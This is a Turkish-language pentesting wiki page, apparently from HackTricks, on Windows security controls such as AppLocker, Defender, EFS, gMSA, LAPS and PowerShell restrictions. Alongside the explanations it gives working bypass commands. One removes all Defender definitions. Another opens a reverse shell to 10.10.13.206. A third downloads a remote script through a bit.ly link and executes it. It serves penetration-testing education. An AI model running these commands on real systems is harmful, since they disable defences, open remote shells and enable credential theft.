# Windows Security Controls

{{#include ../banners/hacktricks-training.md}}

## AppLocker Policy

Bir uygulama whitelist'i, bir sistemde bulunmasına ve çalıştırılmasına izin verilen onaylı yazılım uygulamalarının veya executable'ların listesidir. Amaç, ortamı zararlı malware'lerden ve bir kuruluşun belirli iş ihtiyaçlarıyla uyumlu olmayan onaysız yazılımlardan korumaktır.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker), Microsoft'un **application whitelisting solution**'ıdır ve system administrator'lara **kullanıcıların hangi application'ları ve file'ları çalıştırabileceği** üzerinde kontrol sağlar. Executable'lar, script'ler, Windows installer file'ları, DLL'ler, packaged app'ler ve packed app installer'ları üzerinde **granular control** sunar.\
Kuruluşların **cmd.exe ve PowerShell.exe'yi** ve belirli directory'lere yazma erişimini **block etmesi yaygındır**, **ancak bunların tümü bypass edilebilir**.

### Check

Hangi file/extension'ların blacklist/whitelist'e alındığını kontrol edin:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Bu registry path, AppLocker tarafından uygulanan yapılandırmaları ve politikaları içerir ve sistemde zorunlu kılınan mevcut kuralları incelemenin bir yolunu sağlar:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy'yi bypass etmek için kullanışlı **Writable folders**: AppLocker, `C:\Windows\System32` veya `C:\Windows` içindeki herhangi bir şeyi çalıştırmaya izin veriyorsa, **bunu bypass etmek** için kullanabileceğiniz **yazılabilir klasörler** vardır.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Yaygın olarak **güvenilen** [**"LOLBAS's"**](https://lolbas-project.github.io/) binary'leri AppLocker'ı bypass etmek için de kullanılabilir.
- **Kötü yazılmış kurallar da bypass edilebilir**
- Örneğin, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** için herhangi bir yerde **`allowed` adlı bir klasör** oluşturabilirsiniz; bu klasöre izin verilir.
- Kuruluşlar ayrıca genellikle **`%System32%\WindowsPowerShell\v1.0\powershell.exe` executable'ını engellemeye** odaklanır, ancak `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` veya `PowerShell_ISE.exe` gibi diğer [**PowerShell executable konumlarını**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) gözden kaçırır.
- **DLL enforcement**, bir sistem üzerinde oluşturabileceği ek yük ve hiçbir şeyin bozulmayacağından emin olmak için gereken test miktarı nedeniyle çok nadiren etkinleştirilir. Bu nedenle **DLL'leri backdoor olarak kullanmak AppLocker'ı bypass etmeye yardımcı olur**.
- Herhangi bir process içinde **Powershell** kodu çalıştırmak ve AppLocker'ı bypass etmek için [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanabilirsiniz. Daha fazla bilgi için şu kaynağa bakın: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

Yerel credentials bu dosyada bulunur; parolalar hash'lenmiştir.

### Local Security Authority (LSA) - LSASS

**Credentials** (hash'lenmiş hâlleriyle), Single Sign-On amacıyla bu subsystem'in **memory**'sinde **saklanır**.\
**LSA**, yerel **security policy'yi** (parola policy'si, kullanıcı permissions'ları...), **authentication**'ı, **access token'ları**... yönetir.\
LSA, sağlanan credentials'ları **SAM** dosyası içinde (yerel login için) **kontrol eden** ve bir domain kullanıcısını authenticate etmek için **domain controller** ile iletişim kuran bileşendir.

**Credentials**, **LSASS process'i** içinde **saklanır**: Kerberos ticket'ları, NT ve LM hash'leri, kolayca decrypt edilebilen parolalar.

### LSA secrets

LSA bazı credentials'ları diskte saklayabilir:

- Active Directory computer account'unun parolası (domain controller'a ulaşılamadığında).
- Windows service account'larının parolaları
- Scheduled task'lerin parolaları
- Diğerleri (IIS application'larının parolası...)

### NTDS.dit

Active Directory veritabanıdır. Yalnızca Domain Controller'larda bulunur.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender), Windows 10 ve Windows 11'de ve Windows Server sürümlerinde bulunan bir Antivirus'tür. **`WinPEAS`** gibi yaygın pentesting tool'larını **engeller**. Ancak bu **korumaları bypass etmenin yolları** vardır.

### Check

**Defender**'ın **durumunu** kontrol etmek için PS cmdlet'i olan **`Get-MpComputerStatus`** komutunu çalıştırabilirsiniz (etkin olup olmadığını öğrenmek için **`RealTimeProtectionEnabled`** değerini kontrol edin):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Bunu enumerate etmek için şunu da çalıştırabilirsiniz:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Şifrelenmiş Dosya Sistemi (EFS)

EFS, **Dosya Şifreleme Anahtarı (FEK)** olarak bilinen bir **simetrik anahtar** kullanarak dosyaları şifreleme yoluyla güvence altına alır. Bu anahtar, kullanıcının **public key** anahtarıyla şifrelenir ve şifrelenmiş dosyanın $EFS **alternative data stream**'i içinde saklanır. Şifre çözme gerektiğinde, kullanıcının dijital sertifikasına ait karşılık gelen **private key** anahtarı, $EFS stream içindeki FEK'in şifresini çözmek için kullanılır. Daha fazla ayrıntıya [buradan](https://en.wikipedia.org/wiki/Encrypting_File_System) ulaşabilirsiniz.

**Kullanıcı başlatmadan gerçekleşen şifre çözme senaryoları** şunları içerir:

- Dosyalar veya klasörler [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) gibi EFS olmayan bir file system'e taşındığında otomatik olarak şifreleri çözülür.
- SMB/CIFS protokolü üzerinden network aracılığıyla gönderilen şifrelenmiş dosyaların, transmission öncesinde şifreleri çözülür.

Bu şifreleme yöntemi, dosya sahibi için şifrelenmiş dosyalara **transparent access** sağlar. Ancak yalnızca sahibin password'ünü değiştirmek ve login olmak şifre çözmeye izin vermez.

**Önemli Noktalar**:

- EFS, kullanıcının public key anahtarıyla şifrelenmiş simetrik bir FEK kullanır.
- Şifre çözme işleminde FEK'e erişmek için kullanıcının private key anahtarı kullanılır.
- FAT32'ye kopyalama veya network üzerinden transmission gibi belirli koşullarda otomatik şifre çözme gerçekleşir.
- Şifrelenmiş dosyalara, ek adımlar olmadan sahibi tarafından erişilebilir.

### EFS bilgilerini kontrol etme

Bir **user**'ın bu **service**'i **kullanıp kullanmadığını**, şu path'in mevcut olup olmadığını kontrol ederek öğrenin:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

`cipher /c \<file>\` kullanarak dosyaya **kimlerin** **erişimi** olduğunu kontrol edin\
Bir klasörün içinde `cipher /e` ve `cipher /d` komutlarını kullanarak tüm dosyaları **encrypt** ve **decrypt** edebilirsiniz.

### EFS dosyalarının şifresini çözme

#### Authority System Olmak

Bu yöntem, **victim user**'ın host içinde bir **process** **çalıştırıyor** olmasını gerektirir. Bu durumda, bir `meterpreter` session kullanarak kullanıcının process'inin token'ını (`incognito` içindeki `impersonate_token`) taklit edebilirsiniz. Alternatif olarak kullanıcının process'ine `migrate` edebilirsiniz.

#### Kullanıcının password'ünü bilmek

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft, IT altyapılarında service account'ların yönetimini kolaylaştırmak için **Group Managed Service Accounts (gMSA)** geliştirdi. Genellikle "**Password never expire**" ayarı etkin olan geleneksel service account'ların aksine, gMSA'ler daha güvenli ve yönetilebilir bir çözüm sunar:

- **Otomatik Password Yönetimi**: gMSA'ler, domain veya computer policy'ye göre otomatik olarak değişen, 240 karakterlik karmaşık bir password kullanır. Bu process, Microsoft'un Key Distribution Service (KDC) tarafından yönetilir ve manual password güncellemelerine olan ihtiyacı ortadan kaldırır.
- **Geliştirilmiş Security**: Bu account'lar lockout durumundan etkilenmez ve interactive login için kullanılamaz; bu da security'lerini artırır.
- **Birden Fazla Host Desteği**: gMSA'ler birden fazla host arasında paylaşılabilir; bu da onları birden fazla server üzerinde çalışan service'ler için ideal hale getirir.
- **Scheduled Task Yeteneği**: managed service account'ların aksine gMSA'ler scheduled task çalıştırmayı destekler.
- **Basitleştirilmiş SPN Yönetimi**: Computer'ın sAMaccount ayrıntılarında veya DNS name'inde değişiklik olduğunda system, Service Principal Name'i (SPN) otomatik olarak günceller ve SPN yönetimini basitleştirir.

gMSA'lerin password'leri LDAP property'si _**msDS-ManagedPassword**_ içinde saklanır ve Domain Controller'lar (DCs) tarafından her 30 günde bir otomatik olarak resetlenir. [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) olarak bilinen encrypted data blob biçimindeki bu password, yalnızca yetkili administrator'lar ve gMSA'lerin kurulu olduğu server'lar tarafından alınabilir; bu da güvenli bir ortam sağlar. Bu bilgiye erişmek için LDAPS gibi güvenli bir connection gereklidir veya connection 'Sealing & Secure' ile authenticated olmalıdır.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Bu password'ü [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:** ile okuyabilirsiniz.
```
/GMSAPasswordReader --AccountName jkohler
```
[**Bu gönderide daha fazla bilgi bulabilirsiniz**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Ayrıca, **gMSA**'nın **parolasını** **okumak** için **NTLM relay attack** işleminin nasıl gerçekleştirileceğini anlatan bu [web sayfasına](https://cube0x0.github.io/Relaying-for-gMSA/) göz atın.<sup>[[3]](#references)</sup>

## LAPS

[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) üzerinden indirilebilen **Local Administrator Password Solution (LAPS)**, yerel Administrator parolalarının yönetilmesini sağlar. **Randomized**, benzersiz ve **düzenli olarak değiştirilen** bu parolalar, Active Directory'de merkezi olarak saklanır. Bu parolalara erişim, ACLs aracılığıyla yetkili kullanıcılarla sınırlandırılır. Yeterli izinler verildiğinde, yerel admin parolalarını okuma yeteneği sağlanır.

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/), COM nesnelerini engellemek, yalnızca onaylanmış .NET türlerine izin vermek, XAML tabanlı workflow'ları, PowerShell sınıflarını ve daha fazlasını kısıtlamak gibi PowerShell'i etkili bir şekilde kullanmak için gereken birçok **özelliği kilitler**.

### **Kontrol Et**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Güncel Windows sürümlerinde bu Bypass çalışmaz, ancak [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) kullanabilirsiniz.\
**Derlemek için** **şunları** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` eklemeniz ve **projeyi .Net4.5 olarak değiştirmeniz** gerekebilir.

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanarak herhangi bir process içinde **Powershell** kodu **execute** edebilir ve constrained mode'u bypass edebilirsiniz. Daha fazla bilgi için: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## PS Execution Policy

Varsayılan olarak **restricted** olarak ayarlanmıştır. Bu policy'yi bypass etmenin başlıca yolları:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

Kullanıcıların kimliğini doğrulamak için kullanılabilen API'dir.

SSPI, iletişim kurmak isteyen iki makine için uygun protokolü bulmakla görevlidir. Bunun için tercih edilen yöntem Kerberos'tur. Ardından SSPI, hangi kimlik doğrulama protokolünün kullanılacağını müzakere eder. Bu kimlik doğrulama protokollerine Security Support Provider (SSP) adı verilir; her Windows makinesinde DLL biçiminde bulunurlar ve iletişim kurulabilmesi için her iki makinenin de aynı SSP'yi desteklemesi gerekir.

### Main SSPs

- **Kerberos**: Tercih edilen yöntem
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** ve **NTLMv2**: Uyumluluk nedenleriyle
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web sunucuları ve LDAP için, parola MD5 hash biçimindedir
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL ve TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Kullanılacak protokolü müzakere etmek için kullanılır (Kerberos veya NTLM; varsayılan Kerberos'tur)
- %windir%\Windows\System32\lsasrv.dll

#### Müzakere birkaç yöntem veya yalnızca bir yöntem sunabilir.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **elevated etkinlikler için onay istemi** sağlayan bir özelliktir.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## References

- [1] [Bypassing Applocker and Powershell contstrained language mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [2] [howto ~ decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying for gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 Ways to Bypass the PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

{{#include ../banners/hacktricks-training.md}}
